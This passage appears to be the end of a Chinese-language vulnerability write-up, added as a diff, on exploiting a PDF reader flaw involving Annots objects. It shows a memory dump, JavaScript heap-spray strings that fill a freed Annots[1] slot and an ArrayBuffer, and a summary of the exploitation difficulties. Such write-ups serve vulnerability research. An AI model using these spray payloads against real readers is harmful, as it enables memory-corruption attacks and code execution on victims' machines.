+101000a8  ffffffff ffffffff ffffffff ffffffff
+101000b8  ffffffff ffffffff ffffffff ffffffff
+//占位Annots[1]的字符串代码
+var sprayStr = unescape('%u9090%uFFFF%uFFFF%uFFFF') + unescape('%u0048%u1010').repeat(7) + unescape('%u0058%u1010').repeat(14) + unescape('%u9090');
+//占位ArrayBuffer的字符串代码
+var sprayStrLen1 = (0x10000 / 2) - 1;
+var sprayStr1 = unescape('%u9090%uFFFF%uFFFF%uFFFF') + unescape('%u0000%u0000%u0000%u0000') + unescape('%uFFFF').repeat(sprayStrLen1 - 8);
+</code></pre></div></div>
+
+<p>自此整个利用结束，剩下的内容就是利用读写原语执行代码了不再赘述。</p>
+
+<h1 id="总结">总结</h1>
+
+<p>该漏洞主要的利用难点在于构造占位Annots[1]的字符串和伪造Annots[1]+0x2C指向的结构，这部分不仔细构造的话执行后续的函数会报错。另外也尝试用字符串占位了ArrayBuffer对象，读写原语的构造更加简单了。</p>
+:ET
